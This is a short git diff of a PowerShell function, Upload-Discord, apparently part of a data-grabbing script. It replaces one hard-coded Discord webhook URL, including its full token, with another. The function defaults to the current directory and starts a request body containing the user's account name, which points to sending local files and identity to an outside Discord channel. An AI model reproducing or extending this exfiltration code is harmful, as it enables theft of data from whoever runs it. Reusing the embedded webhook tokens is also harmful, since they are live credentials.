@@ -10,7 +10,7 @@ function Upload-Discord {
         [string]$directory = (Get-Location).Path
     )
 
-    $hookurl = 'https://discord.com/api/webhooks/1376787025948315678/1k2wMoUv6tn-4VwDVGS8IgL4BZbQquj9iu3Raw03N0KQ_ClXtonvsGdl0mQ23gOJgNKK'
+    $hookurl = 'https://discord.com/api/webhooks/1374335410284789791/tMZl31tivirFNsvwCt19-tqu6nirxFBYj2_Q-kFF-UH0GfVuSGaMa1fOFf6lkOVk4Vt9'
 
     $Body = @{
         'username' = $env:username
